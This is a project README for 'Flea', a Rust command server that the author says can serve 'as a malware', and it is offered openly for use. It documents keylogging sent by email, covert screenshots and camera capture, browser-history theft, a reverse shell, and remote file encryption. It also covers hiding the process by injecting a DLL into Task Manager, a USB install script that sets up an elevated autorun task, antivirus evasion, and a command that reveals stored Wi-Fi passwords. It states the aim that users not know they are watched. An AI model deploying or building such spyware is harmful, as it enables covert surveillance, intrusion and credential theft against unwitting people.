# Flea

Version: 0.2.6

A simple command server written in Rust, which can be used as either a command server or a malware, depending on how the software is intended to be used.

This repository consists of three projects:

- Command Server (root)
- Simple Command Sender (flea-client)
- Flea Monitor (C#, WPF, Windows only)

The server is the main project that will be developed. The client is a test program used to validate the protocol and core functionality of the Flea Server. Flea Monitor is a GUI application for conveniently managing the server. Unless otherwise stated, Flea works on both Linux and Windows operating systems.

![Flea Monitor](https://github.com/rozensoftware/flea/blob/master/FleaMonitor.png)

The Flea Monitor would be developed simultaneously with the Flea Server. It doesn't use the client for communication with the server. It is a standalone application for Windows only.

## Purpose

The Flea Server can be utilized as a remote command execution tool or as a program for monitoring and surveillance. It has the capability to spy on computer activities, making it suitable for parental monitoring of children. The purpose of the Flea Server can be customized to meet specific requirements.

## Features

- Remote commands execution based on XML format
- Taking screenshots of a host
- Sending screenshot file to FTP server and/or to the client
- Uploading a file from FTP to the host
- Bash execution on a host (doesn't work perfectly on Windows)
- Key logger
- Key logger can be sent to an email
- Web browsing history of Microsoft Edge, Firefox and Google Chrome
- OS process list
- Killing a process
- Simple file server
- Auto update
- Camera capture
- OS info
- Reverse shell for Windows
- File encryption

The key logger file is cleared during server startup.
The program's capabilities will be enhanced as the software is developed.
To update the server, a new version must be uploaded to the installation location. The new file should be named flea.upd. The server will automatically update on the next run.

## FTP Server

One of Flea's features is the ability to send and receive files from an FTP server. Flea Monitor provides its own FTP server, which can be accessed using the username "anonymous" and any password. This allows for anonymous authentication. The shared folder is created in your TEMP folder with the name "FleaFTP". Please note that this folder may be deleted when cleaning temporary files. You can start the FTP server by selecting the option from the File menu. There is also an option to stop it. The FTP server only works when Flea Monitor is running and will shut down when the application is closed.

[FubarDev FTP Server](https://github.com/FubarDevelopment/FtpServer) project has been used here.

## Command format

The Flea Server requires an XML formatted command like below:

```xml
<Command name='command_name' value='optional_value'></Command>
```

Currently supported commands are:

- **version** : Returns current protocol version.
- **bash** : A host bash command. The value property has to have a command line to execute in a host.
- **ftpscreenshot** : Takes a screenshots of the host and sends it to FTP server.
- **screenshot** : Takes a screenshot and sends it to the caller. The client supports this and saves data into screenshot.png file name.
- **log** : Reads current key logger file and sends its content to receiver.
- **proclist** : Displays currently running processes in the system.
- **kill** : Kills a process. 'value' parameter must include PID.
- **upload** : Uploads a file to the host from FTP server. The file name must be specified in the 'value' parameter of the XML command.
- **dir** : Retreives content of current directory.
- **cd** : Changes the current directory to the new one passed in the 'value' parameter (.. means level up).
- **pwd** : Gets server's working directory.
- **getfile** : Downloads a file passed in the 'value' parameter to the client. The file is read from the current path on the server.
- **setftp** : Sets new FTP parameters: address, user name, password. Parameters must be provided in the 'value' in the following format, e.g. 127.0.0.1;user;my_pass.
- **setemail** : Sets email parameters where key logger file will be sent to in a format: address to, address from, email account user name, password, host address.
- **sendkeylog** : Sends key logger file on email
- **history** : Reads web browsers history of a user which flea process is running for: Edge (Windows only), Firefox and Google Chrome. Data returned is: URL, Title and Visits Number.
- **camera** : Captures one frame (or two seconds long movie on Windows) from camera. The 'value' parameter must have a filename e.g.: frame.jpg (or movie.wmv on Windows). The server with Flea must have a camera installed.
- **sysinfo** : Gets system info
- **restart** : Restarts the Flea Server. Good for patching.
- **lockscreen** : Locks the screen. It can be unlocked in normal way by typing a password.
- **encrypt** : Encrypts a file with a key
- **decrypt** : Decrypts a file with a key
- **quit** : Quits the program. Must be run again.

New commands will be added later.

## Flea Client

The client is used for testing, but can also be used to send commands to the Flea Server.

These are the example commands:

Get current version of the Flea Protocol:

```bash
./flea-client -a 127.0.0.1 -c version
```

Take screenshot and send it to the FTP server:

```bash
./flea-client -a 127.0.0.1 -c ftpscreenshot
```

Take screenshot and send it to the caller. It'll be saved as screenshot.png file:

```bash
./flea-client -a 127.0.0.1 -c screenshot
```

Upload test.txt file from FTP server to the host where Flea Server is running on (test.txt file must exist on FTP server already):

```bash
./flea-client -a MY_SERVER_NAME -c upload -v test.txt
```

Get wlan network profiles (Windows only):

```bash
./flea-client -a MY_SERVER_IP -c bash -v "netsh wlan show profiles"
```

and information with password (Windows only):

```bash
.\flea-client.exe -a 192.168.0.18 -c bash -v "netsh wlan show profile name=network_profile_name key=clear"
```

Change current directory to the previous one:

```bash
./flea-client --address MY_SERVER -c cd -v ..
```

Get camera frame:

```bash
./flea-client -a 192.168.0.1 -c camera -v frame.jpg
```

## Building

Except having installed Rust on Linux you also need to install the following packages to build the software:

```text
build-essential, pkg-config, libx11-dev, libxcb-randr0-dev, libxcb-shm0-dev, libv4l-dev, libssl-dev
```

On Windows, all you need is Rust (alongside a C++ compiler).

If for some reason a camera capture is not needed you can exclude it from build by removing *features = ["camera"]* from cargo.toml:

```toml
flealib = {path = "flealib", features = ["camera"], version = "0.2"}
```

So, without camera the line should look like:

```toml
flealib = {path = "flealib", version = "0.2"}
```

On Windows CameraLib.dll file must be copied to the directory in which flea.exe is installed (if standard build with camera is enabled).
CameraLib.dll can be found in lib directory. This is a 64bit application tested in Windows 11 only. Should work on Widnows 10 too. It uses Microsoft Media Foundation to access the camera.

## Installation

The Flea Server reads the host name of the computer and opens a port there. The IP address can be provided by using -s parameter. If you intend to use FTP server, you will need to complete the connection data. You can do this directly in the code:

```rust
//Enter your data for FTP Server connection
const FTP_USER_NAME: &str = "enter_ftp_user_name";
const FTP_PASS_NAME: & str = "enter_ftp_user_password";
const FTP_ADDRESS_NAME: & str = "enter_ftp_server_ip_address";
const FTP_FOLDER_NAME: & str = "enter_ftp_folder_name";
const SMTP_USER_NAME: &str = "enter_smtp_user_name";
const EMAIL_ADDRESS_TO: &str = "enter_email_address";
const EMAIL_ADDRESS_FROM: &str = "enter_email_address";
const SMTP_PASS_NAME: &str = "enter_smtp_password";
const SMTP_HOST_NAME: &str = "enter_smtp_host";

```

or in the created configuration file (recommended). On Linux you will find the configuration file in a directory: /home/user_name/.config/flea_conf/ .
These parameters can be also changed remotely by sending *setftp* command.

You should do the same when defining a connection to a mailbox. You need to specify the email address to which the file will be sent, the sender's address, the user name of the email account, the password and the address of the email server.

The best way to send messages is to use your own email server, which does not require fancy authorizations. Currently, GMail is not suitable for this. Perhaps in your case you will be able to properly authorize the application and GMail.

The email address should look like this: test <`test@domain.ext`> - name, space and full address surrounded with <> characters.

*Update your default-config-file.tom file if you have previous version (0.2.4 or earlier) or flea won't process commands due to missing configuration.*

Build The Flea server:

```bash
cargo build --release
```

There are various methods of running and installing this software, so I will not describe them here, as they depend directly on your preferences and needs.
The Flea program could be run on the target system, for example:

(I assume that you are typing commands in the same directory where the server executable file is located.)

```bash
./flea &
```

This run the server as a separate process.
On Windows however, you can uncomment line 1 in main.rs.

If you'd like to see debug output from the process run the command:

```bash
RUST_LOG=debug ./flea
```

You can specify IP address on which the server will be listen on:

```bash
./flea -s 127.0.0.1
```

The port number is hardcoded into the program code. It can be changed there or new functionality can be implemented to specify it as a command parameter.
If you are running the server in the console, you can stop it by pressing CTRL-C.

For a quick installation on a computer, you can use the "installflea.ps1" script located in the "install" folder. Simply copy "flea.exe", "CameraLib.dll", "HideProcessHook.dll", and "installflea.ps1" to a USB pendrive, connect it to the computer where you want to install the software, and run the script as an administrator. The Flea will be installed automatically, and a new autorun task and firewall rule will be created for you.
You can modify the script further to achieve the desired functionality.
Please note that this script only works on Windows and in a PowerShell environment.
You may encounter a network access permission message, which you should confirm.

Copying the "HideProcessHook.dll" file is not mandatory. However, if you want to take advantage of hiding the program in the Windows Task Manager, it must be placed in the application directory. It will be injected into the Task Manager to hide the "flea.exe" process. This can only be done when "flea.exe" is running with elevated privileges. That is why the install script registers the task with the highest run level.
The hook injector that I used and modified to my needs is based on the work of [ryan-weil](https://github.com/ryan-weil/HideProcessHook).
**Remember to uncomment line in main.rs file if you want to not show the cmd window:**

```rust
#![windows_subsystem = "windows"]
```

## Reverse Windows shell (test function)

When the program is called with the -b command, it will make a repeated attempt to connect to the remote server every 2 seconds. You can use The *Rozbie Farm* to open a reverse shell (see below: Similar Software). Unfortunately, the address and port of the remote computer must be entered in the program code. Also, the installation script should be changed so that the program runs with this option. For a complete reverse shell feature the *Rozbie* malware should be used.

```powershell
./flea -b
```

## File encryption

This option allows you to remotely encrypt the specified file with the key passed in the command. Subsequent decryption using the same key is possible. The key must be 256 bits (32 bytes) long.

Example:

```powershell
.\flea-client -a 192.168.0.18 -c encrypt -v "a very simple secret key to use!;test.txt"
```

The key is separated from the file name by a semicolon character.

Decryption:

```powershell
.\flea-client -a 192.168.0.18 -c decrypt -v "a very simple secret key to use!;test.txt"
```

## Antivirus

I encountered an issue while testing the software on McAfee. It blocked the installation using the install.ps1 script, falsely identifying it as a virus. To resolve this, I had to remove the execution of flea.exe from the script. A similar issue occurred with Microsoft Defender.

## Camera capture

The Flea Server has the ability to record a short vidoes. On Linux a single frame is taken but on Windows two seconds long video is recorded.
Currently the user can see a glowing light next to the camera when it is on. This is something to work on because we won't a user to know he was being watched.

## Additional scripts

In *scrpipt* folder there could be find additional scripts. Currently there is only *lock.sh* bash script you can copy to install directory. Its purpose is to lock and shutdown screen on Linux. I decided to not write additional command for this on Linux as it is quite easy to execute the script by sending **bash** command to the server.
Windows version is implemented by using *lockscreen* command.

## Similar Software

Please look at the [Rozbie](https://github.com/rozensoftware/rozbie) which has less features but it's more simpler and provides an access to the target computer too.

## FAQ

Q: Why does the Flea Monitor show a connection error even when the flea is running?

A: Everything is fine, except that the Flea Monitor requires configuration on the first start. Go to Settings and enter a valid IP address that the flea is listening to. Restart the application.

## License

This project is licensed under MIT license (LICENSE-MIT or <http://opensource.org/licenses/MIT>).

## Contributing / Feedback

I am quite new to Rust. I am always glad to learn from anyone.
If you want to contribute, you are more than welcome to be a part of the project! Try to share you thoughts first! Feel free to open a new issue if you want to discuss new ideas.

Any kind of feedback is welcome!
